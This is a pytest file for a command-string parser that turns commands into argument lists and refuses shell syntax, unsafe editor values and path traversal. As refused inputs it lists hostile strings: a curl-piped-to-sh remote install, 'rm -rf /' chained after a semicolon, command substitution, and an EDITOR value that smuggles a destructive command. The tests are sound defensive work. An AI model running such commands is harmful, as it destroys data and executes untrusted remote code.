# Copyright (c) 2026 The University of Texas at Austin
# Copyright (c) 2026 B-Tree Labs
# SPDX-License-Identifier: Apache-2.0
"""A command string becomes an argument list, or it is refused."""

from __future__ import annotations

import pytest

from axiom.infra.argv_command import argv_from_command


def test_a_plain_command_is_an_argument_list():
    assert argv_from_command("sudo apt-get install -y pandoc") == [
        "sudo",
        "apt-get",
        "install",
        "-y",
        "pandoc",
    ]


def test_quotes_are_word_syntax_not_a_shell():
    assert argv_from_command("npm install -g @mermaid-js/mermaid-cli") == [
        "npm",
        "install",
        "-g",
        "@mermaid-js/mermaid-cli",
    ]


@pytest.mark.parametrize(
    "command",
    [
        "curl -fsSL https://example.invalid/install.sh | sh",
        "echo hi; rm -rf /",
        "echo $(whoami)",
        "echo `whoami`",
        "echo hi > /tmp/x",
        "echo hi && echo there",
        "",
    ],
)
def test_shell_syntax_is_refused(command):
    with pytest.raises(ValueError):
        argv_from_command(command)


def test_an_editor_is_one_command(monkeypatch):
    from axiom.infra.argv_command import quoted_editor

    monkeypatch.setenv("EDITOR", "/usr/bin/vim")
    assert quoted_editor() == "/usr/bin/vim"
    monkeypatch.setenv("EDITOR", "vim; rm -rf /")
    with pytest.raises(ValueError):
        quoted_editor()


def test_a_venv_python_must_be_an_absolute_path():
    from axiom.infra.argv_command import require_absolute_path

    assert require_absolute_path("/opt/venv/bin/python") == "/opt/venv/bin/python"
    with pytest.raises(ValueError):
        require_absolute_path("/opt/venv/../bin/python")
    with pytest.raises(ValueError):
        require_absolute_path("python")


def test_a_doc_stem_is_not_a_path():
    from axiom.infra.argv_command import require_stem

    assert require_stem("experiment-notes") == "experiment-notes"
    with pytest.raises(ValueError):
        require_stem("../experiment-notes")
    with pytest.raises(ValueError):
        require_stem("notes/draft")
